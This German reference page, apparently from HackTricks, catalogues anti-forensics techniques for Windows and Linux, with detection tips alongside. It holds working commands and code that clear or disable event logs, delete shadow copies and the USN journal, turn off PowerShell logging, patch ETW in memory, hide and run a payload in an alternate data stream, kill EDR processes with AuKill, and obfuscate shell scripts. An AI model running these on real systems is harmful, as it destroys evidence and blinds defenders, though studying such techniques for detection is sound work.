# Anti-Forensik-Techniken

{{#include ../../banners/hacktricks-training.md}}

## Zeitstempel

Ein Angreifer könnte daran interessiert sein, **die Zeitstempel von Dateien zu ändern**, um nicht entdeckt zu werden.\
Die Zeitstempel lassen sich in der MFT in den Attributen `$STANDARD_INFORMATION` \_\_ und \_\_ `$FILE_NAME` finden.

Beide Attribute enthalten 4 Zeitstempel: **Änderung**, **Zugriff**, **Erstellung** und **Änderung des MFT-Eintrags** (MACE oder MACB).

**Windows Explorer** und andere Tools zeigen die Informationen aus **`$STANDARD_INFORMATION`** an.

### TimeStomp - Anti-Forensik-Tool

Dieses Tool **ändert** die Zeitstempelinformationen in **`$STANDARD_INFORMATION`**, **aber nicht** die Informationen in **`$FILE_NAME`**. Daher ist es möglich, **verdächtige Aktivitäten zu erkennen**.

### Usnjrnl

Das **USN Journal** (Update Sequence Number Journal) ist eine Funktion von NTFS (Windows NT File System), die Änderungen am Volume protokolliert. Mit dem Tool [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) lassen sich diese Änderungen untersuchen.

![TimeStomp - Anti-forensisches Tool - Usnjrnl: Das USN Journal (Update Sequence Number Journal) ist eine Funktion von NTFS (Windows NT File System), die Änderungen am Volume protokolliert. Das...](<../../images/image (801).png>)

Das vorherige Bild zeigt die **Ausgabe** des **Tools**, in der zu sehen ist, dass einige **Änderungen an der Datei vorgenommen wurden**.

### $LogFile

**Alle Metadatenänderungen an einem Dateisystem werden** in einem Verfahren namens [Write-Ahead-Logging](https://en.wikipedia.org/wiki/Write-ahead_logging) protokolliert. Die protokollierten Metadaten werden in einer Datei namens `**$LogFile**` im Stammverzeichnis eines NTFS-Dateisystems gespeichert. Tools wie [LogFileParser](https://github.com/jschicht/LogFileParser) können diese Datei analysieren und Änderungen erkennen.

![Usnjrnl - $LogFile: Alle Metadatenänderungen an einem Dateisystem werden in einem Verfahren namens Write-Ahead-Logging protokolliert. Die protokollierten Metadaten werden in einer Datei namens $LogFile im Stammverzeichnis gespeichert...](<../../images/image (137).png>)

Auch in der Ausgabe des Tools ist zu sehen, dass **einige Änderungen vorgenommen wurden**.

Mit demselben Tool lässt sich feststellen, **auf welchen Zeitpunkt die Zeitstempel geändert wurden**:

![Usnjrnl - $LogFile: Mit demselben Tool lässt sich feststellen, auf welchen Zeitpunkt die Zeitstempel geändert wurden](<../../images/image (1089).png>)

- CTIME: Erstellungszeit der Datei
- ATIME: Änderungszeit der Datei
- MTIME: Änderung des MFT-Eintrags der Datei
- RTIME: Zugriffszeit der Datei

### Vergleich von `$STANDARD_INFORMATION` und `$FILE_NAME`

Eine weitere Möglichkeit, verdächtig geänderte Dateien zu erkennen, besteht darin, die Zeitangaben in beiden Attributen zu vergleichen und nach **Abweichungen** zu suchen.

### Nanosekunden

Zeitstempel in **NTFS** haben eine **Präzision** von **100 Nanosekunden**. Daher sind Dateien mit Zeitstempeln wie 2010-10-10 10:10:**00.000:0000 sehr verdächtig**.

### SetMace - Anti-Forensik-Tool

Dieses Tool kann beide Attribute, `$STARNDAR_INFORMATION` und `$FILE_NAME`, ändern. Ab Windows Vista muss dafür jedoch ein Live-OS verwendet werden.

## Datenverstecken

NFTS verwendet Cluster und eine minimale Informationsgröße. Das bedeutet: Wenn eine Datei eineinhalb Cluster belegt, wird die **übrige Hälfte niemals verwendet**, bis die Datei gelöscht wird. Daher lassen sich **Daten in diesem Slack Space verstecken**.

Es gibt Tools wie slacker, mit denen sich Daten in diesem „versteckten“ Speicherplatz verbergen lassen. Eine Analyse von `$logfile` und `$usnjrnl` kann jedoch zeigen, dass Daten hinzugefügt wurden:

![SetMace - Anti-forensisches Tool - Datenverstecken: Es gibt Tools wie slacker, mit denen sich Daten in diesem „versteckten“ Speicherplatz verbergen lassen. Eine Analyse von $logfile und $usnjrnl kann jedoch zeigen, dass...](<../../images/image (1060).png>)

Anschließend lässt sich der Slack Space mit Tools wie FTK Imager auslesen. Beachte, dass solche Tools den Inhalt verschleiert oder sogar verschlüsselt speichern können.

## UsbKill

Dieses Tool **schaltet den Computer aus, wenn eine Änderung an den USB-Ports** erkannt wird.\
Eine Möglichkeit, das Tool zu entdecken, besteht darin, die laufenden Prozesse zu untersuchen und **jedes ausgeführte Python-Skript zu überprüfen**.

## Live-Linux-Distributionen

Diese Distributionen werden **im RAM** ausgeführt. Erkennen lassen sie sich nur, **wenn das NTFS-Dateisystem mit Schreibberechtigungen eingebunden ist**. Ist es nur mit Leseberechtigungen eingebunden, lässt sich der Eindringversuch nicht erkennen.

## Sichere Löschung

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Verzögerte Selbstlöschung unter Windows

Ein laufendes Windows-Image kann gesperrt sein, solange der zugehörige Prozess aktiv ist. Ein Prozess kann die Löschung an ein untergeordnetes `cmd.exe` übergeben, `choice` als Timer verwenden und sich beenden, bevor die Shell `del` ausführt. Durch die Verzögerung kann der ursprüngliche Prozess seinen Image-Handle freigeben; enthält der vollständige Pfad Leerzeichen, muss er in Anführungszeichen gesetzt werden.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Wenn diese Zeichenfolge direkt als Argument an `cmd.exe` übergeben wird, statt sie an einer anderen interaktiven `cmd`-Eingabeaufforderung einzugeben, verwende `&` statt `^&` und `>nul` statt `^>nul`. Dadurch wird der Verzeichniseintrag entfernt; es handelt sich **nicht um sicheres Löschen**, und Ausführungs-, Aufgaben-, Dateisystemjournal- oder andere forensische Spuren werden dadurch nicht beseitigt. Suche nach kurzlebigen `cmd.exe`-Kindprozessen, deren Befehlszeile `choice /T`, `Del` und den Image-Pfad des übergeordneten Prozesses kombiniert.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Windows-Konfiguration

Es ist möglich, mehrere Windows-Protokollierungsmethoden zu deaktivieren, um die forensische Untersuchung erheblich zu erschweren.

### Zeitstempel deaktivieren – UserAssist

Dieser Registrierungsschlüssel speichert Datum und Uhrzeit, zu denen der Benutzer die einzelnen ausführbaren Dateien gestartet hat.

Zum Deaktivieren von UserAssist sind zwei Schritte erforderlich:

1. Setze die beiden Registrierungsschlüssel `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` und `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` auf null, um UserAssist zu deaktivieren.
2. Lösche die Registrierungsteilbäume, die etwa so aussehen: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Zeitstempel deaktivieren – Prefetch

Dabei werden Informationen zu ausgeführten Anwendungen gespeichert, um die Leistung des Windows-Systems zu verbessern. Diese Informationen können jedoch auch für forensische Untersuchungen nützlich sein.

- Führe `regedit` aus.
- Wähle den Dateipfad `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` aus.
- Klicke mit der rechten Maustaste auf `EnablePrefetcher` und `EnableSuperfetch`.
- Wähle bei beiden jeweils „Ändern“ und ändere den Wert von 1 (oder 3) auf 0.
- Starte das System neu.

### Zeitstempel deaktivieren – Zeitpunkt des letzten Zugriffs

Immer wenn ein Ordner auf einem NTFS-Volume eines Windows-NT-Servers geöffnet wird, aktualisiert das System ein Zeitstempelfeld für jeden aufgeführten Ordner. Dieses Feld wird als Zeitpunkt des letzten Zugriffs bezeichnet. Bei einem stark genutzten NTFS-Volume kann sich das auf die Leistung auswirken.

1. Öffne den Registrierungs-Editor (Regedit.exe).
2. Navigiere zu `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Suche nach `NtfsDisableLastAccessUpdate`. Falls der Eintrag nicht existiert, füge diesen DWORD-Wert hinzu und setze ihn auf 1, um den Vorgang zu deaktivieren.
4. Schließe den Registrierungs-Editor und starte den Server neu.

### USB-Verlauf löschen

Alle **USB-Geräteeinträge** werden in der Windows-Registrierung unter dem Registrierungsschlüssel **USBSTOR** gespeichert. Dieser enthält Unterschlüssel, die erstellt werden, wenn du ein USB-Gerät an deinen PC oder Laptop anschließt. Du findest diesen Schlüssel hier: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Wenn du ihn löschst**, wird der USB-Verlauf gelöscht.\
Du kannst auch das Tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) verwenden, um sicherzustellen, dass die Einträge gelöscht wurden (und sie zu löschen).

Eine weitere Datei, in der Informationen zu USB-Geräten gespeichert werden, ist `setupapi.dev.log` unter `C:\Windows\INF`. Auch diese Datei sollte gelöscht werden.

### Schattenkopien deaktivieren

**Schattenkopien auflisten** mit `vssadmin list shadowstorage`\
**Schattenkopien löschen** mit `vssadmin delete shadow`

Du kannst sie auch über die grafische Oberfläche löschen, indem du die Schritte unter [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) ausführst.

So deaktivierst du Schattenkopien [Schritte von hier](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Öffne das Programm „Dienste“, indem du nach dem Klicken auf die Windows-Startschaltfläche „Dienste“ in das Textsuchfeld eingibst.
2. Suche in der Liste nach „Volume Shadow Copy“, wähle den Eintrag aus und öffne mit einem Rechtsklick die Eigenschaften.
3. Wähle im Dropdown-Menü „Starttyp“ die Option „Deaktiviert“ aus und bestätige die Änderung mit „Übernehmen“ und „OK“.

Außerdem lässt sich in der Registrierung unter `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` ändern, welche Dateien in die Schattenkopie aufgenommen werden.

### Gelöschte Dateien überschreiben

- Du kannst ein **Windows-Tool** verwenden: `cipher /w:C`. Damit wird cipher angewiesen, alle Daten aus dem verfügbaren, ungenutzten Speicherplatz auf dem Laufwerk C zu entfernen.
- Du kannst auch Tools wie [**Eraser**](https://eraser.heidi.ie) verwenden.

### Windows-Ereignisprotokolle löschen

- Windows + R --> eventvwr.msc --> „Windows-Protokolle“ erweitern --> mit der rechten Maustaste auf jede Kategorie klicken und „Protokoll löschen“ auswählen
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Windows-Ereignisprotokolle deaktivieren

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Deaktiviere im Abschnitt „Dienste“ den Dienst „Windows Event Log“.
- `WEvtUtil.exec clear-log` oder `WEvtUtil.exe cl`

### $UsnJrnl deaktivieren

- `fsutil usn deletejournal /d c:`

---

## Erweiterte Protokollierung und Manipulation von Spuren (2023–2025)

### PowerShell ScriptBlock-/Modulprotokollierung

Neuere Versionen von Windows 10/11 und Windows Server speichern **umfangreiche forensische Artefakte von PowerShell** unter
`Microsoft-Windows-PowerShell/Operational` (Ereignisse 4104/4105/4106).  
Angreifer können diese spontan deaktivieren oder löschen:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Verteidiger sollten Änderungen an diesen Registrierungsschlüsseln und das massenhafte Entfernen von PowerShell-Ereignissen überwachen.

### ETW (Event Tracing for Windows) Patch

Endpoint-Sicherheitsprodukte stützen sich stark auf ETW. Eine beliebte Umgehungsmethode aus dem Jahr 2024 besteht darin,
`ntdll!EtwEventWrite`/`EtwEventWriteFull` im Speicher zu patchen, sodass jeder ETW-Aufruf `STATUS_SUCCESS` zurückgibt,
ohne das Ereignis auszugeben:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoCs (z. B. `EtwTiSwallow`) implementieren dieselbe Primitive in PowerShell oder C++.  
Da der Patch **prozesslokal** ist, erkennen EDRs, die in anderen Prozessen laufen, ihn möglicherweise nicht.<sup>[[5]](#references)</sup>
Erkennung: `ntdll` im Arbeitsspeicher mit der Version auf der Festplatte vergleichen oder vor dem User-Mode hooken.

### Alternate Data Streams (ADS) Revival

Bei Malware-Kampagnen im Jahr 2023 (z. B. bei Loadern von **FIN12**) wurde beobachtet, dass Second-Stage-Binaries in ADS abgelegt werden, um sich vor herkömmlichen Scannern zu verbergen:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Enumerieren Sie Streams mit `dir /R`, `Get-Item -Stream *` oder Sysinternals `streams64.exe`.
Wird die Host-Datei auf FAT/exFAT oder per SMB kopiert, wird der versteckte Stream entfernt. Das können Ermittler nutzen,
um die Payload wiederherzustellen.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver wird inzwischen routinemäßig für **Anti-Forensik** bei Ransomware-Angriffen
eingesetzt.  
Das Open-Source-Tool **AuKill** lädt einen signierten, aber anfälligen Treiber (`procexp152.sys`), um EDR- und forensische Sensoren **vor der Verschlüsselung und der Zerstörung von Logs** anzuhalten oder zu beenden:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Der Treiber wird anschließend entfernt, sodass nur minimale Artefakte zurückbleiben.<sup>[[1]](#references)</sup>  
Gegenmaßnahmen: Aktivieren Sie die Microsoft Vulnerable Driver Blocklist (HVCI/SAC) und lösen Sie einen Alarm aus, wenn Kernel-Services von Pfaden erstellt werden, die für Benutzer beschreibbar sind.

---

## Linux Anti-Forensics: Self-Patching und Cloud C2 (2023–2025)

### Self-Patching kompromittierter Services zur Verringerung der Erkennung (Linux)
Angreifer „self-patchen“ einen Service zunehmend direkt nach dessen Ausnutzung, um sowohl eine erneute Ausnutzung zu verhindern als auch schwachstellenbasierte Erkennungen zu unterdrücken. Dabei werden verwundbare Komponenten durch die neuesten legitimen Upstream-Binärdateien/JARs ersetzt, sodass Scanner melden, der Host sei gepatcht, während Persistenz und C2 bestehen bleiben.<sup>[[3]](#references)</sup>

Beispiel: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Nach der Ausnutzung luden Angreifer legitime JARs von Maven Central (repo1.maven.org) herunter, löschten verwundbare JARs aus der ActiveMQ-Installation und starteten den Broker neu.
- Dadurch wurde die anfängliche RCE geschlossen, während andere footholds (cron, Änderungen an der SSH-Konfiguration, separate C2-Implants) erhalten blieben.

Operatives Beispiel (zur Veranschaulichung)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Forensik-/Threat-Hunting-Tipps
- Überprüfe Service-Verzeichnisse auf nicht geplante Ersetzungen von Binärdateien/JARs:
  - Debian/Ubuntu: `dpkg -V activemq` und Dateihashes/-pfade mit Repo-Mirrors vergleichen.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Suche nach JAR-Versionen auf dem Datenträger, die keinem Paketmanager gehören, oder nach außerhalb des regulären Prozesses aktualisierten symbolischen Links.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` ausführen, um ctime/mtime mit dem Kompromittierungszeitraum abzugleichen.
- Shell-Verlauf/Prozess-Telemetrie: Hinweise auf `curl`/`wget` zu `repo1.maven.org` oder anderen Artifact-CDNs direkt nach der initialen Ausnutzung.
- Change Management: Prüfe, wer den „Patch“ angewendet hat und warum – nicht nur, ob eine gepatchte Version vorhanden ist.

### C2 über Cloud-Services mit Bearer-Tokens und Anti-Analyse-Stagern
Beobachtetes Tradecraft kombinierte mehrere dauerhafte C2-Pfade mit Anti-Analyse-Paketierung:<sup>[[3]](#references)</sup>
- Passwortgeschützte PyInstaller-ELF-Loader, um Sandbox-Analysen und statische Analysen zu erschweren (z. B. verschlüsseltes PYZ, temporäre Extraktion unter `/_MEI*`).
  - Indikatoren: Treffer von `strings` wie `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Laufzeitartefakte: Extraktion nach `/tmp/_MEI*` oder in benutzerdefinierte `--runtime-tmpdir`-Pfade.
- Dropbox-basiertes C2 mit fest codierten OAuth-Bearer-Tokens
  - Netzwerkindikatoren: `api.dropboxapi.com` / `content.dropboxapi.com` mit `Authorization: Bearer <token>`.
  - Suche in Proxy-/NetFlow-/Zeek-/Suricata-Daten nach ausgehendem HTTPS-Verkehr zu Dropbox-Domains von Server-Workloads, die normalerweise keine Dateien synchronisieren.
- Paralleles/Backup-C2 über Tunneling (z. B. Cloudflare Tunnel `cloudflared`), um die Kontrolle zu behalten, falls ein Kanal blockiert wird.
  - Host-IOCs: `cloudflared`-Prozesse/Units, Konfiguration unter `~/.cloudflared/*.json`, ausgehende Verbindungen über Port 443 zu Cloudflare-Edges.

### Persistenz und „Hardening-Rollback“ zum Erhalt des Zugriffs (Linux-Beispiele)
Angreifer kombinieren häufig Self-Patching mit dauerhaften Zugriffspfaden:<sup>[[3]](#references)</sup>
- Cron/Anacron: Änderungen am `0anacron`-Stub in jedem `/etc/cron.*/`-Verzeichnis zur regelmäßigen Ausführung.
  - Suche:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Rollback der SSH-Konfigurationshärtung: Root-Logins aktivieren und Standard-Shells für Konten mit niedrigen Berechtigungen ändern.
  - Nach der Aktivierung von Root-Logins suchen:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Suchen Sie nach verdächtigen interaktiven Shells bei Systemkonten (z. B. `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Zufällig benannte, kurze Beacon-Artefakte (8 alphabetische Zeichen), die auf dem Datenträger abgelegt werden und außerdem Cloud-C2 kontaktieren:
  - Aufspüren:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Verteidiger sollten diese Artefakte mit externer Exposition und Ereignissen zur Aktualisierung von Diensten korrelieren, um eine zur Verschleierung der initialen Ausnutzung eingesetzte Selbstbereinigung als Anti-Forensik aufzudecken.

## Ausführung eines eingebetteten Shells ohne dynamische Abhängigkeiten

Ein Skript-Wrapper mit eingebettetem Interpreter und implementierten Befehlen kann unterstützte Shell-Operationen in einer einzigen ausführbaren Datei ausführen, anstatt `/bin/sh` und separate Hilfsprogramme zu starten. HimitsuShell erstellt eine solche statische musl-Binärdatei. Anders als [SHc wrappers](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md) müssen die integrierten Befehle weder die Host-Shell noch einen separaten Hilfsprozess starten. Nicht unterstützte Befehle können auf die System-Shell zurückgreifen.<sup>[[9]](#references)</sup>

Dadurch sind Shell-Prozesse und untergeordnete `execve`-Aufrufe weniger sichtbar.<sup>[[9]](#references)</sup> Der Wrapper-Prozess und seine Systemaufrufe bleiben über Kernel-Tracepoints beobachtbar. Die Behauptung des Projekts, selbst für Kernel-Tracing unsichtbar zu sein, sollte daher nicht wörtlich genommen werden.<sup>[[9]](#references)[[11]](#references)</sup>

Verwenden Sie für den dokumentierten x86_64-Build den Eingabenamen `launcher.sh` und kopieren Sie die Datei vor dem Kompilieren in den Container. Die Ausgabe heißt `safeLauncher`:<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

Das öffentliche `compile.sh` verschlüsselt das Skript mit AES-256-CTR, verschlüsselt den Ablaufzeitpunkt sowie Zwischenschlüssel und IVs mit AES-256-CBC, wandelt die verschlüsselten Dateien mit `xxd -i` in C-Arrays um und verknüpft sie mit `lib.bc` mittels `-static -s`. Auch der endgültige Verschlüsselungsschlüssel und IV sind eingebettet. Das schützt vor beiläufiger statischer Extraktion, ist aber kein Geheimnis, das niemals wiederhergestellt werden kann.<sup>[[10]](#references)</sup>

Die standardmäßigen LLVM-Pässe sind `-sobf` und `-sub`. Bearbeite `/var/work/compile.sh` vor dem Build, um dokumentierte Alternativen wie Control-Flow-Flattening (`fla`) oder Bogus Control Flow (`bcf`) zu aktivieren.<sup>[[9]](#references)[[10]](#references)</sup>

Teste die Kompatibilität des Skripts, bevor du dich auf diesen Wrapper verlässt: Das Projekt zielt auf POSIX-Shell-Syntax ab, warnt, dass Bash-/Zsh-Skripte fehlschlagen können, und weist darauf hin, dass Befehle außerhalb der integrierten Befehlsliste die System-Shell aufrufen.<sup>[[9]](#references)</sup>

Eine Analyse von abgeflachtem Control Flow findest du unter [Umgehung von abgeflachtem Control Flow mithilfe eines schmalen Ausführungsslices](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice).

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill: Ein bewaffneter verwundbarer Treiber zum Deaktivieren von EDR (März 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – EtwEventWrite für Stealth patchen: Erkennung und Hunting (Juni 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching für Persistenz: Wie die Linux-Malware DripDropper sich durch die Cloud bewegt](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Dein .NET verbergen – ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Eine in legitimer Software eingebettete SectopRAT-Variante aufgedeckt](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – choice-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – del-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [HimitsuShell-README](https://github.com/HimitsuShell/HimitsuShell)
- [10] [HimitsuShell-Buildskript](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Linux-Kernel-Ereignishistogramme und Syscall-Tracing](https://docs.kernel.org/trace/histogram.html)
